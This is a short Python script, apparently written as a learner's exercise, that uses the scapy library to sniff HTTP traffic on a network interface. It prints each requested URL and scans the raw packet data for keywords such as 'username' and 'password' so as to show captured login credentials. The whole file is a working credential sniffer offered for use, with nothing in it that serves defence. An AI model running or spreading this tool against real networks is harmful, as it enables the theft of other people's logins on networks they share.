#!/usr/bin/env python
import time
#scapy has sniffer function can capture data sent to/from
import scapy.all as scapy
#sniffing the http layer module
from scapy.layers import http


# using scapy function to sniff with callback function
def sniff(interface):
    #iface field for the interface ,the store field for storing the data in the memory, prn for the call back function.
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# accessing http layer to layer that return URL packet
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# checking if packet has any email/password information to sniff it
#first of all using print(packet.show()) check where the login information are in the packet since there is two much information we dontwont
#so we create this filter
def get_login_info(packet):
    #the login info are in a POST method in a scaapy layer called Raw 
    if packet.haslayer(scapy.Raw):
        #load is a field in Raw that has username and pass
        load = packet[scapy.Raw].load
        # arguments key name list to check if it's in packet
        keywords = ['email', 'username', 'user', 'login', 'password', 'pass', 'uname']
        # adding a for loop to itterate on these elements
        for keyword in keywords:
            #check if these element in  the load varaible
            if keyword in load.decode():
                return load

#creating a function that contains the filters  

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request >> ' + url.decode())
        #calling the get_login_info function
        login_info = get_login_info(packet)
        #checking if we have login info , if we have print them.
        if login_info:
            print('\n\n[+] Possible username/password >>' + login_info.decode() + '\n\n')


#calling the interface 
sniff("eth0")
